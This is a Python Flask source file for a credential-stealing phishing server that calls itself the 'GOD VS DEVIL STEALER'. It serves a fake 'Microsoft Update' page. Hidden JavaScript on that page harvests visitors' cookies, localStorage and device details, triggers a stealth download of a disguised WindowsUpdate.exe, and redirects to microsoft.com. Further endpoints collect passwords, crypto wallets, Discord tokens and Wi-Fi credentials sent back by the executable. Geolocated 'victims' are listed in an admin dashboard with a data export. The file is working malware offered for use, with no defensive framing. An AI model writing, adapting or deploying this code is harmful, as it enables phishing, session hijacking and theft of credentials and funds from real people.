import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import requests
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file
from functools import wraps
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# DATABASE
# ==========================================
DB_PATH = 'stealer.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                device_type TEXT,
                os TEXT,
                browser TEXT,
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                screen_res TEXT,
                timezone TEXT,
                language TEXT,
                platform TEXT,
                cpu_cores TEXT,
                ram TEXT,
                passwords TEXT,
                wallets TEXT,
                discord TEXT,
                wifi TEXT,
                hostname TEXT,
                username TEXT,
                mac TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                downloaded_exe BOOLEAN DEFAULT 0,
                ran_exe BOOLEAN DEFAULT 0
            )
        ''')
        conn.commit()

init_db()

# ==========================================
# ADMIN
# ==========================================
ADMIN_USER = "god"
ADMIN_PASS = "devil"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="Login"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# GET REAL IP
# ==========================================
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

# ==========================================
# GET LOCATION
# ==========================================
def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown')
            }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}

# ==========================================
# GET DEVICE INFO
# ==========================================
def get_device_info(ua):
    ua = ua.lower()
    
    if 'mobile' in ua:
        device = 'Phone'
    elif 'tablet' in ua:
        device = 'Tablet'
    else:
        device = 'Desktop'
    
    if 'windows' in ua:
        os = 'Windows'
    elif 'mac' in ua:
        os = 'macOS'
    elif 'linux' in ua:
        os = 'Linux'
    elif 'android' in ua:
        os = 'Android'
    elif 'ios' in ua or 'iphone' in ua:
        os = 'iOS'
    else:
        os = 'Unknown'
    
    if 'firefox' in ua:
        browser = 'Firefox'
    elif 'chrome' in ua:
        browser = 'Chrome'
    elif 'safari' in ua:
        browser = 'Safari'
    elif 'edge' in ua:
        browser = 'Edge'
    else:
        browser = 'Unknown'
    
    return {'device': device, 'os': os, 'browser': browser}

# ==========================================
# MAIN PAGE - MICROSOFT REDIRECT + STEALTH DOWNLOAD
# ==========================================
@app.route('/')
def index():
    real_ip = get_real_ip()
    loc = get_location(real_ip)
    device = get_device_info(request.headers.get('User-Agent', ''))
    
    victim_id = request.cookies.get('vid') or hashlib.md5(os.urandom(16)).hexdigest()[:8]
    
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, ip, real_ip, country, city, isp, device_type, os, browser, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            real_ip,
            loc['country'],
            loc['city'],
            loc['isp'],
            device['device'],
            device['os'],
            device['browser'],
            datetime.datetime.now().isoformat(),
            datetime.datetime.now().isoformat()
        ))
        conn.commit()
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3;url=https://www.microsoft.com">
    <title>Microsoft Update</title>
    <style>
        body {{ 
            background: #f0f0f0;
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding-top: 200px;
        }}
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0078d4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Checking for updates...</h2>
    <p>Please wait while Windows checks for critical security updates.</p>
    
    <script>
    (function() {{
        // ==========================================
        // STEALTH DATA CAPTURE
        // ==========================================
        let stolenData = {{
            cookies: {{}},
            localStorage: {{}},
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            cpu: navigator.hardwareConcurrency || 'unknown',
            ram: navigator.deviceMemory || 'unknown',
            userAgent: navigator.userAgent
        }};
        
        // Capture ALL cookies
        try {{
            document.cookie.split(';').forEach(c => {{
                if(c.trim()) {{
                    let parts = c.trim().split('=');
                    let name = parts[0];
                    let value = parts.slice(1).join('=');
                    stolenData.cookies[name] = value;
                }}
            }});
        }} catch(e) {{}}
        
        // Capture localStorage
        try {{
            for(let i = 0; i < localStorage.length; i++) {{
                let key = localStorage.key(i);
                stolenData.localStorage[key] = localStorage.getItem(key);
            }}
        }} catch(e) {{}}
        
        // Send to server
        fetch('/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(stolenData),
            keepalive: true
        }}).catch(e => console.log('Capture failed'));
        
        // Trigger EXE download in background
        fetch('/WindowsUpdate.exe').catch(e => console.log('Download failed'));
        
        // Set tracking cookie
        document.cookie = "ms_update=active; path=/; max-age=3600";
    }})();
    </script>
</body>
</html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('vid', victim_id, max_age=86400*30)
    return response

# ==========================================
# CAPTURE ENDPOINT
# ==========================================
@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    vid = request.cookies.get('vid')
    
    if data and vid:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    cookies = ?,
                    localStorage = ?,
                    screen_res = ?,
                    timezone = ?,
                    language = ?,
                    platform = ?,
                    cpu_cores = ?,
                    ram = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', {})),
                json.dumps(data.get('localStorage', {})),
                data.get('screen', ''),
                data.get('timezone', ''),
                data.get('language', ''),
                data.get('platform', ''),
                data.get('cpu', ''),
                data.get('ram', ''),
                datetime.datetime.now().isoformat(),
                vid
            ))
            conn.commit()
        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
    return jsonify({"status": "error"}), 400

# ==========================================
# EXE DOWNLOAD
# ==========================================
@app.route('/WindowsUpdate.exe')
def download_exe():
    vid = request.cookies.get('vid', 'unknown')
    with get_db() as conn:
        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (vid,))
        conn.commit()
    return send_file('WindowsUpdate.exe', 
                     as_attachment=True, 
                     download_name='WindowsUpdate.exe',
                     mimetype='application/octet-stream')

# ==========================================
# EXE DATA ENDPOINT
# ==========================================
@app.route('/exe-data', methods=['POST'])
def exe_data():
    data = request.json
    vid = data.get('vid')
    
    if data and vid:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    passwords = ?,
                    wallets = ?,
                    discord = ?,
                    wifi = ?,
                    hostname = ?,
                    username = ?,
                    mac = ?,
                    ran_exe = 1,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('passwords', [])),
                json.dumps(data.get('wallets', [])),
                json.dumps(data.get('discord', [])),
                json.dumps(data.get('wifi', [])),
                data.get('hostname', ''),
                data.get('username', ''),
                data.get('mac', ''),
                datetime.datetime.now().isoformat(),
                vid
            ))
            conn.commit()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ==========================================
# ADMIN DASHBOARD
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC LIMIT 100').fetchall()
        stats = {
            'total': conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0],
            'downloaded': conn.execute('SELECT COUNT(*) FROM victims WHERE downloaded_exe = 1').fetchone()[0],
            'ran': conn.execute('SELECT COUNT(*) FROM victims WHERE ran_exe = 1').fetchone()[0],
            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE cookies IS NOT NULL AND cookies != "null"').fetchone()[0]
        }
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>GOD VS DEVIL</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }}
        .header {{
            background: #111;
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
        }}
        h1 {{ color: #00ff00; }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 20px 0;
        }}
        .stat-card {{
            background: #111;
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
        }}
        .stat-value {{ font-size: 32px; font-weight: bold; color: #00ff00; }}
        .victim-card {{
            background: #111;
            border: 1px solid #333;
            margin: 15px 0;
            padding: 15px;
        }}
        .victim-header {{
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }}
        .victim-id {{ color: #ff00ff; }}
        .victim-ip {{ color: #00ffff; }}
        .cookie-list {{
            max-height: 150px;
            overflow-y: auto;
            font-size: 11px;
            background: #000;
            padding: 10px;
        }}
        .cookie-item {{ border-bottom: 1px solid #333; padding: 3px 0; }}
        .cookie-name {{ color: #ffff00; }}
        .cookie-value {{ color: #ffaa00; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ GOD VS DEVIL STEALER ⚡</h1>
        <p>Microsoft Redirect • Stealth Download • Full Capture</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value">{stats['total']}</div>
            <div>Total Victims</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['cookies']}</div>
            <div>Cookies Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['downloaded']}</div>
            <div>EXE Downloads</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['ran']}</div>
            <div>EXE Executed</div>
        </div>
    </div>
'''
    
    for v in victims:
        cookies = json.loads(v['cookies']) if v['cookies'] else {}
        html += f'''
    <div class="victim-card">
        <div class="victim-header">
            <div>
                <span class="victim-id">{v['victim_id'][:8]}</span>
                <span class="victim-ip">{v['real_ip']}</span>
                <span>{v['city']}, {v['country']}</span>
                <span>{v['device_type']} | {v['os']}</span>
            </div>
            <div style="color: #888;">{v['last_seen'][:19]}</div>
        </div>
        <div class="cookie-list">
            <b>Cookies ({len(cookies)}):</b>
        '''
        for name, value in list(cookies.items())[:20]:
            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:80]}</span></div>'
        html += '''
        </div>
    </div>
    '''
    
    html += '''
</body>
</html>
    '''
    return html

# ==========================================
# EXPORT DATA
# ==========================================
@app.route('/export')
@authenticate
def export():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=stealer_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

# ==========================================
# HEALTH CHECK
# ==========================================
@app.route('/ping')
def ping():
    return jsonify({"status": "operational", "time": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)
